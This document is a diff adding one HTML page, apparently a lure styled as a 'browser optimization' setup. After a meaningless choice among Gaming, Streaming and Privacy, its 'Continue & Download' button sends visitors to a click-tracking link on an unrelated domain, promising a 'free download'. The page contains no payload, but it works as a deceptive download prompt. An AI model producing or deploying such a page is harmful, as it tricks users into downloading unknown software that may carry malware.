@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Quick Setup</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial;
+background:#111;
+color:white;
+text-align:center;
+}
+
+.container{
+padding:60px 20px;
+max-width:600px;
+margin:auto;
+}
+
+h1{
+color:#ff0055;
+}
+
+.box{
+background:#1c1c1c;
+padding:30px;
+border-radius:10px;
+margin-top:20px;
+}
+
+.option{
+background:#2a2a2a;
+padding:15px;
+margin:10px 0;
+border-radius:8px;
+cursor:pointer;
+}
+
+.option:hover{
+background:#ff0055;
+}
+
+.btn{
+display:none;
+background:#ff0055;
+color:white;
+padding:18px 40px;
+font-size:20px;
+border-radius:8px;
+text-decoration:none;
+margin-top:20px;
+display:inline-block;
+}
+
+.note{
+margin-top:20px;
+font-size:13px;
+color:#aaa;
+}
+
+</style>
+
+<script>
+
+function selectOption(){
+document.getElementById("btn").style.display="inline-block";
+}
+
+</script>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h1>Optimize Your Browser Experience</h1>
+
+<p>Select your main usage to continue:</p>
+
+<div class="box">
+
+<div class="option" onclick="selectOption()">🎮 Gaming</div>
+<div class="option" onclick="selectOption()">🎬 Streaming</div>
+<div class="option" onclick="selectOption()">🔒 Privacy</div>
+
+</div>
+
+<a id="btn" class="btn" href="https://cctlds.homes/click">
+Continue & Download
+</a>
+
+<div class="note">
+Free download • No registration required
+</div>
+
+</div>
+
+</body>
+</html>
